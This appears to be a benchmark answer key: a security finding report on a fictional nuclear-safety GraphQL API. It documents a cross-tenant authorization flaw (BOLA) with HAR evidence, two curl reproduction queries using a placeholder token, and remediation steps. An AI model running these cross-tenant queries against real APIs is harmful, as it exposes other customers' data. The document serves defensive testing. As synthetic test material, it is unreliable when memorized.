# Expected Response

## System
- Domain: Nuclear / Reactor Safety
- System: ReactorCore Safety API
- Example ID: GQL-0090

## Priority Findings

### Finding 1: Nuclear Safety Record BOLA — Related Linked Resources Accessible Cross-Tenant (Pattern 1.2)
**Severity:** Critical
**Category:** BOLA / Safety-Critical

**Summary:**
Per §5.0 (Pattern 1.2 — related or linked resources): The `getResource` resolver fetches by ID only, exposing linked safety records. An attacker from `tenant-51a2` accessed nuclear reactor safety record `R-2090` belonging to `tenant-0025`. In a nuclear safety context, unauthorized access to reactor operational parameters, safety interlock states, and maintenance records constitutes a Category A security incident under NRC/IAEA regulatory frameworks. The `getResourceWithChildren` resolver further exposes nested safety system components without re-validation.

**Evidence from HAR:**
- Request: `POST https://api.reactorcore-safety.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-51a2`
- Query: `getResource(id: "R-2090") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`; `tenantId: "tenant-0025"`, `ownerId: "other-user-51a20025"`, `sensitiveField: "CONFIDENTIAL-51a20025"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-51a20025`

## Steps to Reproduce

### Step 1 — Cross-tenant nuclear safety record access (HAR)
```bash
curl -s -X POST https://api.reactorcore-safety.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-51a2" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2090\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-51a20025` — nuclear safety data from `tenant-0025`. **Secure:** FORBIDDEN.

### Step 2 — Traverse linked safety sub-systems
```bash
curl -s -X POST https://api.reactorcore-safety.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-51a2" \
  -d '{"query": "query { getResourceWithChildren(id: \"R-2090\") { resourceId tenantId items { resourceId tenantId data { sensitiveField } } } }"}'
```
**Vulnerable:** Nested safety interlock/component records from `tenant-0025` returned.

## Remediation
1. Resolver tenant guard on `getResource` and `getResourceWithChildren`: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Re-validate authorization at each nested safety sub-system node.
3. Apply allowlisting for nuclear safety resolver access — only authorized roles.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
